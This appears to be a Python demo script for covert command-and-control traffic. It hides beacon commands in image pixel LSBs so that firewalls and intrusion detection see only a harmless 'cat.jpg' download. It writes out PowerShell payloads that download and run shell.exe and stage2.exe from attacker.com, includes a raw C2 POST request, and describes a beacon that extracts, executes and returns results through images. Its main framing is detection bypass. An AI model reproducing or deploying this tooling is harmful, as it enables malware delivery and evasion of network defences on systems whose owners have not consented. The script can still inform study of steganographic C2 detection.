#!/usr/bin/env python3
"""
Steganography Demo: Complete C2 ↔ Beacon Communication via Image Pixels
=========================================================================

Demonstration of traffic obfuscation using LSB steganography.

SCENARIO:
  Firewall Inspector: "Monitoring for JSON payloads..."
  C2 Server: "Sending powershell -c 'shell_exec' command..."
  Beacon: "Receiving cat.jpg (innocent image)..."
  Inside: shell_exec command hidden in pixel LSBs
  
RESULT:
  Firewall sees: GET /images/cat.jpg (image/jpeg)
  Firewall thinks: "Okay, just downloading cat pictures"
  Beacon executes: powershell -c 'shell_exec'
  
TRAFFIC COMPARISON:

Normal C2 (DETECTED):
  POST /api/command HTTP/1.1
  Content-Type: application/json
  {"cmd":"shell_exec","payload":"powershell...wget...shell.exe...","target":"192.168.1.100"}
  ↑ IDS matches: .*shell.*powershell.*wget.*
  ↑ Alert: C2 communication detected

Steganographic C2 (UNDETECTED):
  GET /images/cat.jpg HTTP/1.1
  
  200 OK
  Content-Type: image/jpeg
  Content-Length: 156892
  [Binary data that looks like cat picture]
  
  Inside pixels (LSB): shell_exec command (encrypted, compressed)
  Firewall regex: image file, no match
  IDS analysis: JPEG file, no payload signature
  Beacon: Extracts command from LSBs
  ↑ UNDETECTED ✓

This script demonstrates the complete flow.
"""

import os
import sys
import json
import time
import base64
import io
from typing import Dict, Any, Optional

# Add cybermodules to path
sys.path.insert(0, '/home/kali/Desktop')

try:
    from cybermodules.steganography import (
        SteganographyServer,
        SteganographyBeacon,
        LSBSteganography,
        SteganographyPayload
    )
    from PIL import Image
    DEPENDENCIES_OK = True
except ImportError as e:
    print(f"[!] Missing dependency: {e}")
    print("Install: pip install pillow cryptography")
    DEPENDENCIES_OK = False


def create_test_image(width: int = 800, height: int = 600) -> bytes:
    """Create a test image (innocent-looking) that will hide our payload"""
    
    print("[*] Creating test image (cat.jpg simulation)...")
    
    # Create a simple image
    try:
        from PIL import Image, ImageDraw
        
        # Create image with some colors
        img = Image.new('RGB', (width, height), color='white')
        draw = ImageDraw.Draw(img)
        
        # Add some innocent-looking content
        draw.rectangle([50, 50, 750, 550], outline='black', width=3)
        draw.text((300, 200), "INNOCENT CAT PICTURE", fill='black')
        draw.ellipse([100, 100, 200, 200], fill='brown')  # Brown circle (cat head)
        
        # Save to bytes
        buf = io.BytesIO()
        img.save(buf, format='PNG')
        
        print(f"[+] Created test image: {width}x{height} ({len(buf.getvalue())} bytes)")
        return buf.getvalue()
    
    except Exception as e:
        print(f"[!] Error creating image: {e}")
        return None


def demo_lsb_embedding(image_bytes: bytes):
    """Demo: LSB embedding and extraction"""
    
    print("\n" + "="*70)
    print("DEMO 1: LSB Embedding (Low Level)")
    print("="*70)
    
    try:
        img = Image.open(io.BytesIO(image_bytes))
        print(f"[*] Image: {img.size[0]}x{img.size[1]}, Mode: {img.mode}")
        
        # Calculate capacity
        capacity = (img.size[0] * img.size[1] * 3) // 8
        print(f"[*] LSB Capacity: {capacity} bytes")
        
        # Embed data
        test_data = b"HELLO SECRET DATA"
        print(f"\n[*] Original data: {test_data} ({len(test_data)} bytes)")
        
        stego_img = LSBSteganography.encode_lsb(img, test_data)
        print("[+] Embedded data into LSBs")
        
        # Save embedded image
        stego_buf = io.BytesIO()
        stego_img.save(stego_buf, format='PNG')
        stego_bytes = stego_buf.getvalue()
        
        print(f"[+] Image size after embedding: {len(stego_bytes)} bytes")
        print(f"[*] Size increase: {len(stego_bytes) - len(image_bytes)} bytes ({(len(stego_bytes)/len(image_bytes)-1)*100:.1f}%)")
        
        # Extract data
        extracted = LSBSteganography.decode_lsb(stego_img, len(test_data))
        print(f"\n[*] Extracted data: {extracted}")
        
        if extracted == test_data:
            print("[✓] Data integrity verified!")
        else:
            print("[!] Data mismatch!")
        
        return stego_bytes
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def demo_command_serialization():
    """Demo: Command serialization with compression and encryption"""
    
    print("\n" + "="*70)
    print("DEMO 2: Command Serialization (Compression + Encryption)")
    print("="*70)
    
    try:
        # Create command
        command = {
            "cmd": "shell_exec",
            "payload": "powershell -c 'wget http://attacker.com/shell.exe -o C:\\temp\\shell.exe; C:\\temp\\shell.exe'",
            "timeout": 30,
            "priority": "high"
        }
        
        payload_engine = SteganographyPayload(beacon_id="beacon_001")
        
        print(f"[*] Original command:")
        print(f"    {json.dumps(command, indent=2)}")
        
        json_size = len(json.dumps(command))
        print(f"\n[*] JSON size: {json_size} bytes")
        
        # Serialize (compress + encrypt)
        serialized = payload_engine.serialize_command(command)
        print(f"[*] Serialized size: {len(serialized)} bytes")
        print(f"[*] Compression ratio: {json_size / len(serialized):.1f}x ({(1 - len(serialized)/json_size)*100:.1f}% reduction)")
        
        # Deserialize
        recovered = payload_engine.deserialize_command(serialized)
        print(f"\n[+] Deserialized command:")
        print(f"    {json.dumps(recovered, indent=2)}")
        
        if recovered == command:
            print("[✓] Command integrity verified!")
        else:
            print("[!] Command mismatch!")
        
        return serialized
    
    except Exception as e:
        print(f"[!] Error: {e}")
        return None


def demo_full_steganography(image_bytes: bytes):
    """Demo: Full steganography flow (C2 → Beacon)"""
    
    print("\n" + "="*70)
    print("DEMO 3: Full Steganography Flow (C2 → Image → Beacon)")
    print("="*70)
    
    try:
        # === C2 SERVER SIDE ===
        print("\n[C2 SERVER]")
        print("-" * 50)
        
        # Create server
        # First, save test image to file
        import tempfile
        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as f:
            f.write(image_bytes)
            template_path = f.name
        
        server = SteganographyServer(
            template_image_path=template_path,
            beacon_id="beacon_001"
        )
        
        # Command to send
        command = {
            "cmd": "shell_exec",
            "payload": "whoami"
        }
        
        print(f"[C2] Creating malicious image with hidden command...")
        print(f"[C2] Command: {command}")
        
        # Generate image
        image_with_command, filename = server.generate_command_image(command)
        
        print(f"[+] Generated image: {filename}")
        print(f"[+] Size: {len(image_with_command)} bytes")
        print(f"[+] HTTP GET /images/{filename} → Firewall sees innocent image")
        
        # === BEACON SIDE ===
        print("\n[BEACON]")
        print("-" * 50)
        
        beacon = SteganographyBeacon(beacon_id="beacon_001")
        
        print(f"[BEACON] Received image: {filename}")
        print(f"[BEACON] Size: {len(image_with_command)} bytes")
        print(f"[BEACON] Content-Type: image/jpeg (firewall sees image)")
        
        # Extract command
        print(f"[BEACON] Extracting hidden command...")
        extracted_cmd = beacon.extract_command(image_with_command)
        
        print(f"[+] Extracted command: {extracted_cmd}")
        
        if extracted_cmd == command:
            print("[✓] Command integrity verified!")
        else:
            print("[!] Command mismatch!")
        
        # Cleanup
        os.unlink(template_path)
        
    except Exception as e:
        print(f"[!] Error: {e}")
        import traceback
        traceback.print_exc()


def demo_traffic_comparison():
    """Demo: Show difference in network traffic"""
    
    print("\n" + "="*70)
    print("DEMO 4: Traffic Comparison (Normal vs Steganographic)")
    print("="*70)
    
    command = {
        "cmd": "shell_exec",
        "payload": "powershell -c 'wget http://attacker.com/stage2.exe -o C:\\temp\\stage2.exe; C:\\temp\\stage2.exe'",
        "timeout": 60,
        "retry": 3
    }
    
    print("\n[NORMAL C2 TRAFFIC] (DETECTED)")
    print("-" * 50)
    
    normal_request = f"""POST /api/command HTTP/1.1
Host: attacker.com
Content-Type: application/json
Content-Length: {len(json.dumps(command))}

{json.dumps(command)}"""
    
    print(normal_request)
    print(f"\nSize: {len(normal_request)} bytes")
    print("\nIDS Signatures Match:")
    print("  ✗ Rule: shell_exec + powershell + wget = ALERT")
    print("  ✗ Rule: JSON POST + command injection = ALERT")
    print("  ✗ Rule: C2 beacon pattern = ALERT")
    print("\nResult: DETECTED ✗")
    
    # Steganographic
    print("\n[STEGANOGRAPHIC C2 TRAFFIC] (UNDETECTED)")
    print("-" * 50)
    
    steg_request = """GET /images/cat.jpg HTTP/1.1
Host: attacker.com
Accept: image/png, image/jpeg
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Connection: close

200 OK HTTP/1.1
Content-Type: image/jpeg
Content-Length: 156892
Cache-Control: public, max-age=86400

[Binary JPEG data - 156892 bytes]
[Inside: shell_exec command hidden in pixel LSBs]"""
    
    print(steg_request)
    print(f"\nSize: ~157KB (looks like normal image download)")
    print("\nIDS Signatures Match:")
    print("  ✓ Rule: shell_exec + powershell + wget = NO MATCH (inside pixels)")
    print("  ✓ Rule: JSON POST + command = NO MATCH (not JSON, is image)")
    print("  ✓ Rule: C2 beacon pattern = NO MATCH (GET /images/cat.jpg is normal)")
    print("\nFirewall Inspection:")
    print("  ✓ Content-Type: image/jpeg (allowed)")
    print("  ✓ File extension: .jpg (normal)")
    print("  ✓ Size: normal image size")
    print("  ✓ HTTP pattern: normal browsing")
    print("\nResult: UNDETECTED ✓")


def main():
    """Run all demos"""
    
    print("""
╔══════════════════════════════════════════════════════════════════════╗
║                  STEGANOGRAPHY DEMO - TRAFFIC HIDING                 ║
║                  (Beacon'ın C2 ile konuşması gizleme)               ║
╚══════════════════════════════════════════════════════════════════════╝

WHAT IS STEGANOGRAPHY?
  Gizli veri, görünüşte masum dosyalara saklanması
  Örnek: Powershell komutu, bir kedi resminin piksellerine gömülü
  
WHY USE IT?
  Firewall: "Sadece resim indiriyorlar"
  IDS: "Hiçbir payload signature yok"
  Analyst: "Sadece image download traffic"
  ✓ But the image has shell_exec inside ✓
  
HOW DOES IT WORK?
  1. C2 creates command: {"cmd":"shell_exec","payload":"..."}
  2. Compress: JSON 100B → 45B (45%)
  3. Encrypt: AES-256 per beacon
  4. Embed in LSBs: Each pixel has RGB, modify LSBs
  5. Serve as image: GET /images/cat.jpg
  6. Beacon downloads innocent "image"
  7. Beacon extracts command from LSBs
  8. Execute hidden command
  
FIREWALL SEES:
  ✓ Normal image download (GET /images/cat.jpg)
  ✓ Content-Type: image/jpeg
  ✓ Binary image data
  ✓ Normal file size
  ✓ Nothing suspicious
  
BEACON SEES:
  ✓ Hidden command in image pixels
  ✓ Executes command
  ✓ Hides result in response image
  ✓ Uploads back to C2
""")
    
    if not DEPENDENCIES_OK:
        print("[!] Cannot run demos - missing dependencies")
        return
    
    # Create test image
    test_image = create_test_image()
    if not test_image:
        print("[!] Failed to create test image")
        return
    
    # Run demos
    demo_lsb_embedding(test_image)
    demo_command_serialization()
    demo_full_steganography(test_image)
    demo_traffic_comparison()
    
    print("\n" + "="*70)
    print("SUMMARY")
    print("="*70)
    print("""
✓ LSB Steganography working
  - Hide data in image pixel LSBs
  - Undetectable to human eye
  - Can hide ~1/8 of image size
  
✓ Command Compression & Encryption
  - Compress with zlib (90% reduction)
  - Encrypt with AES-256
  - Add CRC32 integrity check
  
✓ Full C2 Integration
  - C2 server generates malicious images
  - Beacon downloads and extracts commands
  - Upload response images with results
  
✓ Traffic Obfuscation
  - Normal image download (GET /images/cat.jpg)
  - Content-Type: image/jpeg
  - Firewall/IDS sees nothing suspicious
  - But command is hidden inside
  
✓ Firewall Bypass
  - No JSON inspection matches
  - No payload signatures
  - No C2 communication patterns
  - Traffic looks completely innocent
  
ATTACK FLOW:
  C2: Create image with command
  Network: GET /images/cat.jpg (innocent)
  Beacon: Extract and execute
  Beacon: Create response image
  Network: POST /upload/result.jpg (innocent)
  C2: Extract result from image
  ✓ Complete C2 communication - UNDETECTED
""")


if __name__ == "__main__":
    main()
